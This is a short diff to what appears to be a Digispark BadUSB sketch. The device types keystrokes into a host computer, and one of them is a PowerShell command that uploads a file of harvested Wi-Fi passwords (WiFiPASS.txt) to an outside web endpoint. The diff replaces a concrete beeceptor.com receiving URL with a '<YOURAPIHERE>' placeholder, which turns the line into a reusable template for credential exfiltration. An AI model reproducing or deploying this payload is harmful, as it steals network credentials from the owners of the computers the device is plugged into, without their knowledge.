@@ -28,7 +28,7 @@ void setup() {
     DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
     DigiKeyboardDe.delay(700);
 
-  DigiKeyboardDe.print("powershell -Command \"Invoke-WebRequest -Uri https://wifigrabber.free.beeceptor.com -Method POST -InFile .\\\\WiFiPASS.txt -ContentType application/x-www-form-urlencoded -UseBasicParsing\"");
+  DigiKeyboardDe.print("powershell -Command \"Invoke-WebRequest -Uri <YOURAPIHERE> -Method POST -InFile .\\\\WiFiPASS.txt -ContentType application/x-www-form-urlencoded -UseBasicParsing\"");
     DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
     DigiKeyboardDe.delay(1000);
   
@@ -43,3 +43,4 @@ void setup() {
 
 void loop() {
 }
+
